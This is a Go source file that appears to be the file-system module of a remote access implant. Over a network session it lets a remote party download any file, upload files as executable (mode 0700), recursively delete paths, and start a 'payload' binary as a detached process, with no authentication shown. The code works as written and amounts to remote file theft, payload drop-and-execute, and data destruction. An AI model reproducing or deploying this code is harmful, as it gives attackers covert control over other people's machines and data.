// +build fs all

package base

import (
	"net"
//	"io"
	"os"
	"os/exec"
	"syscall"
//	"sync"
//	"time"
//	"bytes"
//	"io/ioutil"

	kit "../toolkit"
	"../smux"
)

func init() {
	RegOps(B_fs, ccFs)
}

var ccFs = func (op string, p1 net.Conn, c *Client, mux *smux.Session) {
//	kit.WriteVLen(p1, int64(-2))

	op2, err := kit.ReadTagStr(p1)
	if err != nil {
		return
	}

	switch op2 {
	case B_get:
		fp, err := kit.ReadVTagByte(p1)
		if err != nil {
			break
		}
		fd, err := os.OpenFile(string(fp), os.O_RDONLY, 0444)
		if err != nil {
			// can't open file
			break
		}
		defer fd.Close()
		finfo, err := fd.Stat()
		if err != nil {
			// can't stat file
			break
		}
		kit.WriteVLen(p1, finfo.Size())
		kit.Cp1(fd, p1)

	case B_push:
		fp, err := kit.ReadVTagByte(p1)
		if err != nil {
			break
		}
		fd, err := os.OpenFile(string(fp), os.O_WRONLY | os.O_CREATE | os.O_TRUNC , 0700)
		if err != nil {
			// can't create file
			return
		}
		defer fd.Close()
		kit.Cp1(p1, fd)

	case B_del:
		fp, err := kit.ReadVTagByte(p1)
		if err != nil {
			kit.WriteVLen(p1, int64(-1))
			break
		}
		err = os.RemoveAll(string(fp))
		if err != nil {
			kit.WriteVLen(p1, int64(-1))
			break
		}
		kit.WriteVLen(p1, int64(0))

	case B_call:
		fpb, err := kit.ReadVTagByte(p1)
		if err != nil {
			break
		}

		fp := string(fpb)
		// check exist?
		if _, err := os.Stat(fp); os.IsNotExist(err) {
			kit.WriteVLen(p1, int64(-2))
			return
		} else {
			kit.WriteVLen(p1, int64(0))
		}
		call(p1, fp)
	}

}

var call = func (p1 net.Conn, bin string) {
	// call payload
	pl := exec.Command(bin)
	pl.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
//		Noctty: true,
	}
	err := pl.Start()
	if err != nil {
		p1.Write([]byte(err.Error()))
		return
	}
	err = pl.Process.Release()
	if err != nil {
		p1.Write([]byte(err.Error()))
	}
}


